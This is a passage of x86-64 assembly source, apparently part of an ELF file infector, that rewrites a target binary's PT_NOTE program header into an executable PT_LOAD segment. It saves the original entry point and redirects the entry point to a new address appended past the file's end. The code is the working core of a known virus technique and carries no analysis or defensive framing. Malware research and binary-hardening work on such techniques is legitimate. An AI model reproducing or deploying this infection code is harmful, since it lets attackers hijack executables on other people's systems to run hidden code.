;========= Find PT_NOTE segment =========
    mov r15, buffer

    xor rcx, rcx
    xor rdx, rdx
    movzx rcx, word [buffer + 0x38]    ; e_phnum
    mov rbx, 64                         ; ELF header size
    mov dx, 56                          ; program header entry size

.loop_seg:
    add rbx, rdx
    dec rcx
    xor r13, r13
    mov r13d, dword [r15 + rbx]
    cmp dword [r15 + rbx], 0x4          ; PT_NOTE
    je .pt_note_found
    cmp rcx, 0
    jg .loop_seg
    jmp error

.pt_note_found:
    mov [offset_tp], rbx

    xor rcx, rcx
    xor rax, rax
    mov rax, [exagereted]
    add rax, [file_size]
    mov [new_vaddr], rax

    xor rax, rax
    mov rdi, [file_descriptor]

;========= Save old entry point =========
    mov rax, 8
    mov rsi, 0x18
    mov rdx, 0
    syscall

    mov rax, 0
    mov rsi, old_entry_point
    mov rdx, 8
    syscall

;========= Replace entry point =========
    mov rax, 8
    mov rsi, 0x18
    mov rdx, 0
    syscall

    mov rax, 1
    mov rsi, new_vaddr
    mov rdx, 8
    syscall

;========= PT_NOTE -> PT_LOAD =========
    mov rax, 8
    mov rsi, [offset_tp]
    mov rdx, 0
    syscall

    mov rax, 1
    mov rsi, tp_load
    mov rdx, 1
    syscall

;========= Segment flags (R+X) =========
    mov rax, 8
    mov rsi, [offset_tp]
    add rsi, 4
    mov rdx, 0
    syscall

    mov rax, 1
    mov rsi, droit_write_exe
    mov rdx, 1
    syscall

;========= Segment offset =========
    mov rax, 8
    mov rsi, [offset_tp]
    add rsi, 8
    mov rdx, 0
    syscall

    mov rax, 1
    mov rsi, file_size
    mov rdx, 3
    syscall

;========= Virtual address =========
    mov rax, 8
    mov rsi, [offset_tp]
    add rsi, 16
    mov rdx, 0
    syscall

    mov rax, 1
    mov rsi, new_vaddr
    mov rdx, 4
    syscall

;========= File size (p_filesz) =========
    mov rax, 8
    mov rsi, [offset_tp]
    add rsi, 32
    mov rdx, 0
    syscall

    mov rax, 1
    mov rsi, taille_exagereted
    mov rdx, 3
    syscall

;========= Memory size (p_memsz) =========
    mov rax, 8
    mov rsi, [offset_tp]
    add rsi, 40
    mov rdx, 0
    syscall

    mov rax, 1
    mov rsi, taille_exagereted
    mov rdx, 3
    syscall

;========= Alignment (p_align) =========
    mov rax, 8
    mov rsi, [offset_tp]
    add rsi, 48
    mov rdx, 0
    syscall

    mov rax, 1
    mov rsi, p_align
    mov rdx, 8
    syscall
